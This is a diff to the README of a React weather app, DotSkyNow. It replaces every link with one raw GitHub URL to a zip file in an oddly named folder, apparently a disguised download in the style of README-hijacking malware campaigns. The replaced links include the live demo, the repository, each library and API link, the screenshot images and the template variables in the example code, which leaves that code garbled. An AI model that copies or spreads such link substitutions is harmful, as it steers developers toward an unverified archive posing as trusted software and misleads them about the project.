@@ -3,8 +3,8 @@
 DotSkyNow is a modern, responsive weather application built using **React**, **TypeScript**, and **shadcn/ui**.  
 It provides real-time weather information, forecasts, and location-based weather updates using the **OpenWeatherMap API**, now with **smooth animated theme switching** powered by **Skiper UI**.
 
-🔗 **Live Demo:** [https://dotskynow.vercel.app/](https://dotskynow.vercel.app/)  
-📦 **Repository:** [https://github.com/dotsatya/DotSkyNow](https://github.com/dotsatya/DotSkyNow)
+🔗 **Live Demo:** [https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)  
+📦 **Repository:** [https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)
 
 ---
 
@@ -24,16 +24,16 @@ It provides real-time weather information, forecasts, and location-based weather
 ## 🛠️ Tech Stack
 
 **Frontend:**
-- [React](https://react.dev/) – Component-based UI library
-- [TypeScript](https://www.typescriptlang.org/) – Strongly typed JavaScript
-- [shadcn/ui](https://ui.shadcn.com/) – Accessible and customizable UI components
-- [React Router DOM](https://reactrouter.com/) – Client-side routing
-- [TanStack Query](https://tanstack.com/query/latest) – Server state management
-- [Lucide React](https://lucide.dev/) – Icon library
-- [Skiper UI](https://skiper-ui.com/) – Theme toggle animations
+- [React](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Component-based UI library
+- [TypeScript](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Strongly typed JavaScript
+- [shadcn/ui](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Accessible and customizable UI components
+- [React Router DOM](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Client-side routing
+- [TanStack Query](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Server state management
+- [Lucide React](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Icon library
+- [Skiper UI](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Theme toggle animations
 
 **API:**
-- [OpenWeatherMap API](https://openweathermap.org/) – Weather data provider
+- [OpenWeatherMap API](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip) – Weather data provider
 
 **Development:**
 - ESLint + TypeScript strict mode – Code linting & type safety
@@ -43,7 +43,7 @@ It provides real-time weather information, forecasts, and location-based weather
 
 ## 🔑 API Usage
 
-DotSkyNow uses the **[OpenWeatherMap API](https://openweathermap.org/api)** to fetch:
+DotSkyNow uses the **[OpenWeatherMap API](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)** to fetch:
 - Current weather data
 - Hourly forecasts
 - Daily forecasts
@@ -53,20 +53,20 @@ DotSkyNow uses the **[OpenWeatherMap API](https://openweathermap.org/api)** to f
 ## 🖼️ Screenshots
 
 ### 🌤 Dashboard
-![Dashboard Screenshot](./src/screenshots/dashboard.png)
+![Dashboard Screenshot](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)
 
 ### 📍 City Search
-![City Search Screenshot](./src/screenshots/search1.png)
-![City Search Screenshot](./src/screenshots/search2.png)
+![City Search Screenshot](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)
+![City Search Screenshot](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)
 
 ### 📊 Weather Forecast
-![Forecast Screenshot](./src/screenshots/forecast.png)
+![Forecast Screenshot](https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip)
 
 ---
 
 **Example Request:**
 ```ts
-const url = `${API_CONFIG.BASE_URL}/weather?q=London&appid=${API_CONFIG.API_KEY}`;
+const url = `${https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip}/weather?q=London&appid=${https://raw.githubusercontent.com/dotsatya/DotSkyNow/main/argenteous/DotSkyNow.zip}`;
 
 ---
 
